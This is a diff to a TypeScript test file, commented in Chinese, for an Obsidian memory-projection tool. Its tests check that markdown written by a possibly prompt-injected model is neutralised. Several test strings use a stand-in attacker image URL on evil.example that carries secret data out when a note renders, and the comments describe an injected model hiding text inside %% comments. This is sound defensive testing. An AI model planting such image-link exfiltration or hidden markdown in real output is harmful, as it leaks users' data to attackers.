@@ -6,7 +6,7 @@
  * 只来自闭集 / 链只指真实存在的文件)。
  */
 
-import { mkdtemp, mkdir, readFile, rm, stat, writeFile } from 'node:fs/promises'
+import { mkdtemp, mkdir, readFile, readdir, rm, stat, symlink, writeFile } from 'node:fs/promises'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { fileURLToPath } from 'node:url'
@@ -18,7 +18,9 @@ import {
   buildKnowledgeLinkTable,
   isSafeTierId,
   linkifyKnowledgePaths,
+  mdSafe,
   MEMORY_PROJECTION_DIR,
+  OBSIDIAN_PROJECTION_LIMITS,
   oneLine,
   openObsidianProjector,
   planMemoryProjections,
@@ -340,5 +342,126 @@ describe('写盘:派生物永远不打断真相', () => {
     const p = openObsidianProjector({ dir: nested })
     await p.projectMemory([fact()], T0)
     expect(await stat(join(nested, MEMORY_PROJECTION_DIR))).toBeTruthy()
+  })
+})
+
+// ---------------------------------------------------------------------------
+// Codex 轮 C —— 投影正文是**被注入的模型写的字**,md 又不是纯文本
+// ---------------------------------------------------------------------------
+
+describe('判断④:自由文本进 md 之前先中和掉「会被渲染成行为」的记号', () => {
+  it('外链图片被中和 —— 打开 vault 不会替攻击者发出一个请求', () => {
+    // 这是整条判断里唯一「会真的动网络」的一种:Obsidian 打开笔记就渲染图片,
+    // 请求从**成员自己的机器**发出去,绕过 hub 这一侧的每一道出网边界。
+    const out = mdSafe('![](https://evil.example/p?d=secret)')
+    expect(out).not.toContain('![](')
+    expect(out).toContain('https://evil.example/p?d=secret') // 字还在,只是不再是链
+  })
+
+  it('注释语法被中和 —— 事实不能把自己藏起来', () => {
+    // `%%…%%` 在阅读视图里整段不显示。让被注入的蒸馏器能写它,等于让「投影
+    // 是给成员看的那一份」这句话失效。
+    expect(mdSafe('真话 %%这一段在阅读视图里看不见%%')).not.toContain('%%')
+  })
+
+  it('单个百分号不动 —— 只转义成对的那种', () => {
+    // 「完成度 80%」每天都会出现;把它写成 `80\%` 是把每一份投影都弄脏。
+    // 能这么写是因为:裸 `%` 只在左右邻居都不是 `%` 时才输出 ⇒ 输出里不可能有相邻的两个裸 `%`。
+    expect(mdSafe('完成度 80%')).toBe('完成度 80%')
+    expect(mdSafe('%%%')).not.toContain('%%')
+  })
+
+  it('伪造的 wiki 链、行内代码、HTML 标签一并中和', () => {
+    expect(mdSafe('[[knowledge/伪造的一篇.md]]')).not.toContain('[[')
+    // 反引号仍在字面上(读者要看到原文),但每一个都带上了反斜杠 ⇒ 不再开代码段。
+    expect(mdSafe('`看起来像代码`')).toBe('\\`看起来像代码\\`')
+    expect(mdSafe('<img src=x>')).toBe('\\<img src=x\\>')
+  })
+
+  it('中和真的挂在渲染路径上(事实行与 cluster 标题都过它)', () => {
+    const md = renderMemoryTierProjection(
+      { id: 'persona', label: '![](https://evil.example/t.png)' },
+      [fact({ text: '![](https://evil.example/f.png) 与 %%藏起来%%' })],
+    )
+    expect(md).not.toContain('![](')
+    expect(md).not.toContain('%%')
+  })
+
+  it('文件名里带链语法定界符的,宁可不连也不连错', () => {
+    // `[ ] | # ^` 是 `[[…]]` 自己的定界符;一个叫 `会议[草稿].md` 的文件根本
+    // 无法被 wikilink 表达 —— 指不准,就不指。
+    const table = buildKnowledgeLinkTable(['会议[草稿].md', '正常的一篇.md'])
+    expect(table.map((t) => t.token)).toEqual(['knowledge/正常的一篇.md', '正常的一篇.md'])
+  })
+})
+
+describe('判断⑤:只读到一个窗口时,不许把「没看见」渲染成「没有了」', () => {
+  it('窗口没读满 ⇒ 空掉的 cluster 照删(这是真的空了)', () => {
+    const plans = planMemoryProjections([], T0, { tiers: [{ id: 'persona', label: '人物' }] })
+    expect(plans.map((p) => [p.tierId, p.body])).toEqual([['persona', null]])
+  })
+
+  it('窗口读满了 ⇒ 空掉的 cluster 既不写也不删,旧投影原地留着', () => {
+    const plans = planMemoryProjections([], T0, { tiers: [{ id: 'persona', label: '人物' }] }, undefined, {
+      windowed: true,
+    })
+    // 陈旧的一份至少曾经是真的;删掉它是让成员的 vault 里凭空少一块,还没有解释。
+    expect(plans).toEqual([])
+  })
+
+  it('窗口读满了 ⇒ 投出来的那几份在正文里说明白「没列全」', () => {
+    const md = renderMemoryTierProjection({ id: 'persona', label: '人物' }, [fact()], { windowed: true })
+    expect(md).toContain('这次只读到最新的一批事实')
+  })
+
+  it('重复的 cluster id 只投一次并 warn(两条计划会互相覆盖,后写的赢)', () => {
+    const warns: string[] = []
+    const plans = planMemoryProjections(
+      [fact()],
+      T0,
+      { tiers: [{ id: 'persona', label: '人物' }, { id: 'persona', label: '重名' }] },
+      { warn: (m) => warns.push(m) },
+    )
+    expect(plans).toHaveLength(1)
+    expect(warns.some((w) => w.includes('duplicate'))).toBe(true)
+  })
+})
+
+describe('已完成的任务:留最近的,不是留最早的', () => {
+  it('超过上限时按 updatedAt 新→旧取', () => {
+    const many = Array.from({ length: OBSIDIAN_PROJECTION_LIMITS.maxClosedTasks + 5 }, (_, i) =>
+      task({ id: `tn-${i}`, title: `第 ${i} 件`, status: 'closed', updatedAt: T0 + i * 1000 }),
+    )
+    const md = renderTasksProjection(many)
+    // 最新那件必须在,最旧那几件被挤掉 —— 反过来的话「最近完成了什么」永远看不到。
+    expect(md).toContain(`第 ${many.length - 1} 件`)
+    expect(md).not.toContain('第 0 件')
+  })
+})
+
+describe('memory/ 是符号链接时:不跟着走', () => {
+  it('拒绝经它写,并且 warn', async () => {
+    const outside = await mkdtemp(join(tmpdir(), 'gotong-outside-'))
+    try {
+      await symlink(outside, join(dir, MEMORY_PROJECTION_DIR), 'dir')
+      const warns: string[] = []
+      const p = openObsidianProjector({ dir, logger: { warn: (m) => warns.push(m) } })
+      await p.projectMemory([fact()], T0)
+      expect(await readdir(outside)).toEqual([]) // 链接那一头一个字节没落
+      expect(warns.some((w) => w.includes('symlink'))).toBe(true)
+    } finally {
+      await rm(outside, { recursive: true, force: true })
+    }
+  })
+
+  it('删除路径响亮抛错,不把「删不掉」说成「已经忘了」', async () => {
+    const outside = await mkdtemp(join(tmpdir(), 'gotong-outside-'))
+    try {
+      await symlink(outside, join(dir, MEMORY_PROJECTION_DIR), 'dir')
+      const p = openObsidianProjector({ dir })
+      await expect(p.removeMemoryProjections()).rejects.toThrow(/符号链接/)
+    } finally {
+      await rm(outside, { recursive: true, force: true })
+    }
   })
 })
